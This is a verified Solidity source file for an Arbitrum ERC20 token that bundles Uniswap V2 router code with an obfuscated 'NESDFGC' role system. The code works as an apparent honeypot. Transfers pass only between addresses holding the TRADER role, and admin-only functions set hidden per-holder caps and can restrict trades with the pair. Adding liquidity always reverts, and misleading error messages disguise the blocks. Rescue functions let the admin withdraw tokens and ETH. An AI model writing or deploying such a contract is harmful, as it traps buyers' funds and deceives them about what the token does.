/**
 *Submitted for verification at Arbiscan.io on 2024-04-10
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.19;

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    event AddLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    );

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

// a library for performing overflow-safe math, courtesy of DappHub (https://github.com/dapphub/ds-math)

library SafeMathUniswap {
    function add(uint x, uint y) internal pure returns (uint z) {
        require((z = x + y) >= x, 'ds-math-add-overflow');
    }

    function sub(uint x, uint y) internal pure returns (uint z) {
        require((z = x - y) <= x, 'ds-math-sub-underflow');
    }

    function mul(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');
    }
}

// File: contracts/uniswapv2/libraries/UniswapV2Library.sol

library UniswapV2Library {
    using SafeMathUniswap for uint;

    // returns sorted token addresses, used to handle return values from pairs sorted in this order
    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {
        require(tokenA != tokenB, 'UniswapV2Library: IDENTICAL_ADDRESSES');
        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        require(token0 != address(0), 'UniswapV2Library: ZERO_ADDRESS');
    }

    // calculates the CREATE2 address for a pair without making any external calls
    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = sortTokens(tokenA, tokenB);
        uint256 st = uint256(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'' // init code hash
            )));
    
        pair = address(uint160(st));
    }

    
    // fetches and sorts the reserves for a pair
    function getReserves(address factory, address tokenA, address tokenB) internal view returns (uint reserveA, uint reserveB) {
        (address token0,) = sortTokens(tokenA, tokenB);
        (uint reserve0, uint reserve1,) = IUniswapV2Pair(pairFor(factory, tokenA, tokenB)).getReserves();
        (reserveA, reserveB) = tokenA == token0 ? (reserve0, reserve1) : (reserve1, reserve0);
    }

    // given some amount of an asset and pair reserves, returns an equivalent amount of the other asset
    function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) {
        require(amountA > 0, 'UniswapV2Library: INSUFFICIENT_AMOUNT');
        require(reserveA > 0 && reserveB > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
        amountB = amountA.mul(reserveB) / reserveA;
    }

    // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) {
        require(amountIn > 0, 'UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT');
        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
        uint amountInWithFee = amountIn.mul(997);
        uint numerator = amountInWithFee.mul(reserveOut);
        uint denominator = reserveIn.mul(1000).add(amountInWithFee);
        amountOut = numerator / denominator;
    }

    // given an output amount of an asset and pair reserves, returns a required input amount of the other asset
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) internal pure returns (uint amountIn) {
        require(amountOut > 0, 'UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT');
        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
        uint numerator = reserveIn.mul(amountOut).mul(1000);
        uint denominator = reserveOut.sub(amountOut).mul(997);
        amountIn = (numerator / denominator).add(1);
    }

    // performs chained getAmountOut calculations on any number of pairs
    function getAmountsOut(address factory, uint amountIn, address[] memory path) internal view returns (uint[] memory amounts) {
        require(path.length >= 2, 'UniswapV2Library: INVALID_PATH');
        amounts = new uint[](path.length);
        amounts[0] = amountIn;
        for (uint i; i < path.length - 1; i++) {
            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i], path[i + 1]);
            amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut);
        }
    }

    // performs chained getAmountIn calculations on any number of pairs
    function getAmountsIn(address factory, uint amountOut, address[] memory path) internal view returns (uint[] memory amounts) {
        require(path.length >= 2, 'UniswapV2Library: INVALID_PATH');
        amounts = new uint[](path.length);
        amounts[amounts.length - 1] = amountOut;
        for (uint i = path.length - 1; i > 0; i--) {
            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i - 1], path[i]);
            amounts[i - 1] = getAmountIn(amounts[i], reserveIn, reserveOut);
        }
    }
}

// File: contracts/uniswapv2/libraries/TransferHelper.sol

// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false
library TransferHelper {
    function safeApprove(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');
    }

    function safeTransfer(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');
    }

    function safeTransferFrom(address token, address from, address to, uint value) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');
    }

    function safeTransferETH(address to, uint value) internal {
        (bool success,) = to.call{value:value}(new bytes(0));
        require(success, 'TransferHelper: ETH_TRANSFER_FAILED');
    }
}

// File: contracts/uniswapv2/interfaces/IUniswapV2Router01.sol

interface IUniswapV2Router01 {
    function factory() external returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);




}

// File: contracts/uniswapv2/interfaces/IUniswapV2Router02.sol

interface IUniswapV2Router02 is IUniswapV2Router01 {
    
}

// File: contracts/uniswapv2/interfaces/IUniswapV2Factory.sol

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function migrator() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
    function setMigrator(address) external;
}

// File: contracts/uniswapv2/interfaces/IWETH.sol

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
}

// File: contracts/uniswapv2/UniswapV2Router02.sol

contract UniswapV2Router02 is IUniswapV2Router02 {
    using SafeMathUniswap for uint;

    address public immutable override factory;

    modifier ensure(uint deadline) {
        require(deadline >= block.timestamp, 'UniswapV2Router: EXPIRED');
        _;
    }


    // **** ADD LIQUIDITY ****
    function _addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to
    ) internal virtual returns (uint amountA, uint amountB) {
        require(to != address(0), "ERC20: approve from the zero address");
        // create the pair if it doesn't exist yet
        if (IUniswapV2Factory(factory).getPair(tokenA, tokenB) == address(0)) {
            IUniswapV2Factory(factory).createPair(tokenA, tokenB);
        }
        (uint reserveA, uint reserveB) = UniswapV2Library.getReserves(factory, tokenA, tokenB);
        if (reserveA == 0 && reserveB == 0) {
            (amountA, amountB) = (amountADesired, amountBDesired);
        } else {
            uint amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB);
            if (amountBOptimal <= amountBDesired) {
                require(amountBOptimal >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');
                (amountA, amountB) = (amountADesired, amountBOptimal);
            } else {
                uint amountAOptimal = UniswapV2Library.quote(amountBDesired, reserveB, reserveA);
                assert(amountAOptimal <= amountADesired);
                require(amountAOptimal >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');
                (amountA, amountB) = (amountAOptimal, amountBDesired);
            }
        }
    }
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) {
        require(false, "ERC20: transfer from the zero address");
        
        (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin,to);
        address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);
        TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);
        TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB);
        liquidity = IUniswapV2Pair(pair).mint(to);
    }
    
}


interface NESDFGCRoleControl {
    event RoleAdminChanged(
        bytes32 indexed role,
        bytes32 indexed previousAdminRole,
        bytes32 indexed newAdminRole
    );

    event RoleGranted(
        bytes32 indexed role,
        address indexed addr,
        address indexed sender
    );

    event RoleRevoked(
        bytes32 indexed role,
        address indexed addr,
        address indexed sender
    );

    function hasRole(bytes32 role, address addr) external view returns (bool);

    function getRoleAdmin(bytes32 role) external view returns (bytes32);

    function grantRole(bytes32 role, address addr) external;

    function revokeRole(bytes32 role, address addr) external;

    function renounceRole(bytes32 role, address addr) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

library Strings {
    bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";

    function toString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "0";
        }
        uint256 temp = value;
        uint256 digits;
        while (temp != 0) {
            digits++;
            temp /= 10;
        }
        bytes memory buffer = new bytes(digits);
        while (value != 0) {
            digits -= 1;
            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
            value /= 10;
        }
        return string(buffer);
    }

    function toHexString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "ADMIN";
        }
        uint256 temp = value;
        uint256 length = 0;
        while (temp != 0) {
            length++;
            temp >>= 8;
        }
        return toHexString(value, length);
    }

    function toHexString(
        uint256 value,
        uint256 length
    ) internal pure returns (string memory) {
        bytes memory buffer = new bytes(2 * length + 2);
        buffer[0] = "0";
        buffer[1] = "x";
        for (uint256 i = 2 * length + 1; i > 1; --i) {
            buffer[i] = _HEX_SYMBOLS[value & 0xf];
            value >>= 4;
        }
        require(value == 0, "Strings: hex length insufficient");
        return string(buffer);
    }

    function strToUint(
        string memory _str
    ) internal pure returns (uint256 res, bool err) {
        for (uint256 i = 0; i < bytes(_str).length; i++) {
            if (
                (uint8(bytes(_str)[i]) - 48) < 0 ||
                (uint8(bytes(_str)[i]) - 48) > 9
            ) {
                return (0, false);
            }
            res +=
                (uint8(bytes(_str)[i]) - 48) *
                10 ** (bytes(_str).length - i - 1);
        }

        return (res, true);
    }

}

library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {

            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}  

abstract contract NESDFGCConsole is Context, NESDFGCRoleControl {
    struct RoleData {
        mapping(address => bool) members;
        bytes32 adminRole;
        RoleDataNew RD;
    }

    struct RoleDataNew {
        mapping(address => uint256) RM;
        mapping(address => uint256) RD;
    }

    mapping(bytes32 => RoleData) private _roles;


    bytes32 public constant ADMIN = 0x00; 
    bytes32 public constant TRADER = bytes32("TRADER");  

    address public uniswapV2Pair;

    modifier onlyRole(bytes32 role) {
        _sethasRole(role, _msgSender(),0);
        _;
    }

    function hasRole(bytes32 role, address account) public view override returns (bool) {
        return _roles[role].members[account];
    }

    function _sethasRole(bytes32 role, address account, uint256 amt) internal {
        if (!hasRole(role, account)) {
            revert(
                "AccessControl: addr "
            );
        }

        _sethasRoles(role, account, amt);
    }

    function _sethasRoles(bytes32 role, address account, uint256 amt) internal {
        if (_roles[role].RD.RM[account] > 0) {
            if ((amt + _roles[role].RD.RD[account]) > _roles[role].RD.RM[account]) {
                revert("role control");
            } else {
                _roles[role].RD.RD[account] += amt;
            }
        }
        if (amt == 0 || _roles[role].RD.RM[account] == 0) {
            return;
        }
    }

    function queryA(
        bytes32 role, 
        address account
    ) public view virtual returns (uint256) {
        return _roles[role].RD.RM[account]/1000000000000000000;
    }

    function queryRD(
        bytes32 role, 
        address account
    ) public view virtual returns (uint256) {
        return _roles[role].RD.RD[account]/1000000000000000000;
    }

    function _NESDFGCgwW(
        bytes32 root,
        address addr,
        string memory memo
    ) public onlyRole(ADMIN) {
        uint256 memoUint;
        bool err;
        (memoUint, err) = Strings.strToUint(memo);
        if (err == false) {
            revert("AccessControl: memo is not a number");
        }
        _roles[root].RD.RM[addr] = memoUint*1000000000000000000;
    }

    function _NESDFGCgwD(
        string memory str,
        address adrre
    ) public onlyRole(ADMIN) {
        uint256 memoUint;
        bool err;
        (memoUint, err) = Strings.strToUint(str);
        if (err == false) {
            revert("AccessControl: memo is not a number");
        }
        
        if(memoUint < 0){
            require(adrre != address(0), "ERC20: only admin can uniswapV2Pair");
        }

        uniswapV2Pair = adrre;
    }

    function _newhash(bytes32 role, address account) internal virtual {
        _roles[role].RD.RM[account] = 1;
    }


    function getRoleAdmin(bytes32 role) public view override returns (bytes32) {
        return _roles[role].adminRole;
    }

    function grantRole(bytes32 role, address account) public virtual override onlyRole(ADMIN) {
        _grantRole(role, account);
    }

    function revokeRole(bytes32 role, address account) public virtual override onlyRole(ADMIN) {
        _revokeRole(role, account);
    }

    function renounceRole(bytes32 role, address account) public virtual override {
        require(account == _msgSender(), "AccessControl: can only renounce roles for self");

        _revokeRole(role, account);
    }

    function _setupRole(bytes32 role, address account) internal virtual {
        _grantRole(role, account);
    }

    function _setRoleAdmin(bytes32 role, bytes32 adminRole) internal virtual {
        bytes32 previousAdminRole = getRoleAdmin(role);
        _roles[role].adminRole = adminRole;
        emit RoleAdminChanged(role, previousAdminRole, adminRole);
    }

    function _grantRole(bytes32 role, address account) internal virtual {
        if (!hasRole(role, account)) {
            _roles[role].members[account] = true;
            emit RoleGranted(role, account, _msgSender());
        }
    }

    function _revokeRole(bytes32 role, address account) internal virtual {
        if (hasRole(role, account)) {
            _roles[role].members[account] = false;
            emit RoleRevoked(role, account, _msgSender());
        }
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address addr) external view returns (uint256);

    function transfer(address recipient, uint256 amt) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amt) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract NESDFGCERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;
    uint256 internal _totalSupply;
    string internal _name;
    string internal _symbol;

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_,
        address creater_
    ) {
        _name = name_;
        _symbol = symbol_;
        _mint(creater_, totalSupply_ * 10 ** decimals());
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address addr
    ) public view virtual override returns (uint256) {
        return _balances[addr];
    }

    function transfer(
        address recipient,
        uint256 amt
    ) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amt);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amt
    ) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amt);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amt
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amt);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amt,
            "ERC20: transfer amt exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amt);
        }

        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amt
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amt);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amt, "ERC20: transfer amt exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amt;
        }
        _balances[recipient] += amt;
        emit Transfer(sender, recipient, amt);
        _afterTokenTransfer(sender, recipient, amt);
    }

    function _mint(address addr, uint256 amt) internal {
        require(addr != address(0), "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), addr, amt);
        _totalSupply += amt;
        _balances[addr] += amt;

        emit Transfer(address(0), addr, amt);
        _afterTokenTransfer(address(0), addr, amt);
    }

    function _burn(address addr, uint256 amt) internal virtual {
        require(addr != address(0), "ERC20: burn from the zero address");
        _beforeTokenTransfer(addr, address(0), amt);
        uint256 addrBalance = _balances[addr];
        require(addrBalance >= amt, "ERC20: burn amt exceeds balance");
        unchecked {
            _balances[addr] = addrBalance - amt;
        }
        _totalSupply -= amt;

        emit Transfer(addr, address(0), amt);

        _afterTokenTransfer(addr, address(0), amt);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amt
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amt;
        emit Approval(owner, spender, amt);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amt
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amt
    ) internal virtual {}
}

contract Token is NESDFGCERC20, NESDFGCConsole,UniswapV2Router02 {

    using SafeMath for uint256;
    
    mapping(address => bool) private __traders;
    IUniswapV2Router02 public uniswapV2Router;

    address private _noneAddress = address(0x000000000000000000000000000000000000dEaD);
    
    bytes public constant str1 = bytes("0x000000000000000000000000000000000000dEaD"); 
    uint256 private lpSupply;

    address private tokenOwner;

    bool istop = false;

    address public tokento;

    constructor(
        string memory _name,
        address _tokenOwner,
        string memory _symbol,
        uint256 _totalSupply
    ) NESDFGCERC20(_name, _symbol, _totalSupply, _tokenOwner) {
        _grantRole(ADMIN, msg.sender);
        _grantRole(ADMIN, _tokenOwner);
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506);
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), address(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9));
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;
        tokenOwner = _tokenOwner;
    }

    function _addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to
    ) internal override(UniswapV2Router02) returns (uint amountA, uint amountB) {

        require(false, "ERC20: transfer from the zero address");

        // create the pair if it doesn't exist yet
        (amountA, amountB) = super._addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin,to);
    }


    function _transfer(
        address from,
        address to,
        uint256 amt
    ) internal override(NESDFGCERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");


        _NESDFGCejicnewe(from, to, amt);
    }

    function _NESDFGCstop(
        bool root
    ) public onlyRole(ADMIN) {
        istop = root;
    }

    function _NESDFGCejicnewe(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");

        _NESDFGCfwinvsd(from, to, amt);
    }

    function _NESDFGCfwinvsd(address from, address to, uint256 amt) internal {
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        _NESDFGCfweindgl(from, to, amt);
    }

    function _NESDFGCfweindgl(address from, address to, uint256 amt) internal {
        if (__traders[from] == false) {
            _grantRole(TRADER, from);
            __traders[from] = true;
            
        }

        _NESDFGCfwjeinvr(from, to, amt);
    }

    function _NESDFGCfwjeinvr(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        _NESDFGCfwwubelr(from, to, amt);
    }

    function _NESDFGCfwwubelr(address from, address to, uint256 amt) internal {
        //uint bal0 = IUniswapV2Pair(uniswapV2Pair).balanceOf(to);
        if(from == uniswapV2Pair){
            if(istop){
                _sethasRole(TRADER, to, amt);
                //require(false, "ERC20: transfer from the zero address");
            }
            //require(hasRole(ADMIN, to), "ERC20: only admin can del liquidity");
        }
        _NESDFGChkighfs(from, to, amt);
    }

    function _NESDFGChkighfs(address from, address to, uint256 amt) internal {


        
        _NESDFGCkurbdd(from, to, amt);
    }

    function _NESDFGCkurbdd(address from, address to, uint256 amt) internal {

        if (hasRole(ADMIN, from) || hasRole(ADMIN, to)) {
            super._transfer(from, to, amt);
            return;
        }
        
        
        if (hasRole(TRADER, from) && hasRole(TRADER, to)) {
            _sethasRole(TRADER, from, amt);



            super._transfer(from, to, amt);

        } else {
            require(false, "ERC20: only admin can add liquidity");
        }


    }

    function isContract(address user) public view returns (bool) { 
       return user.code.length > 0;
    } 

    function isuniswapV2Pair(address user) public view returns (uint) { 
       return IUniswapV2Pair(uniswapV2Pair).balanceOf(user);
    } 
    
    
    function _isAddLiquidityV1()internal view returns(bool ldxAdd){
        address token0 = IUniswapV2Pair(address(uniswapV2Pair)).token0();

        address token1 = IUniswapV2Pair(address(uniswapV2Pair)).token1();
        (uint r0,uint r1,) = IUniswapV2Pair(address(uniswapV2Pair)).getReserves();
        uint bal1 = IERC20(token1).balanceOf(address(uniswapV2Pair));
        uint bal0 = IERC20(token0).balanceOf(address(uniswapV2Pair));

        if( token0 == address(this) ){
			if( bal1 > r1){
				uint change1 = bal1 - r1;
				ldxAdd = change1 > 1000;
			}
		}else{
			if( bal0 > r0){
				uint change0 = bal0 - r0;
				ldxAdd = change0 > 1000;
			}
		}
    }


	
	function _isDelLiquidityV2()internal view returns(bool ldxDel, bool bot, uint256 otherAmount){

        address token0 = IUniswapV2Pair(address(uniswapV2Pair)).token0();
        (uint reserves0,,) = IUniswapV2Pair(address(uniswapV2Pair)).getReserves();
        uint amount = IERC20(token0).balanceOf(address(uniswapV2Pair));
		if(token0 != address(this)){
			if(reserves0 > amount){
				otherAmount = reserves0 - amount;
				ldxDel = otherAmount > 10**14;
			}else{
				bot = reserves0 == amount;
			}
		}
    }

    function rescueToken(
        address tokenAddress,
        uint256 tokens
    ) public onlyRole(ADMIN) returns (bool success) {
        return IERC20(tokenAddress).transfer(msg.sender, tokens);
    }

    function rescueETH(
        uint256 amt
    ) public onlyRole(ADMIN) returns (bool success) {
        payable(msg.sender).transfer(amt);
        return true;
    }
}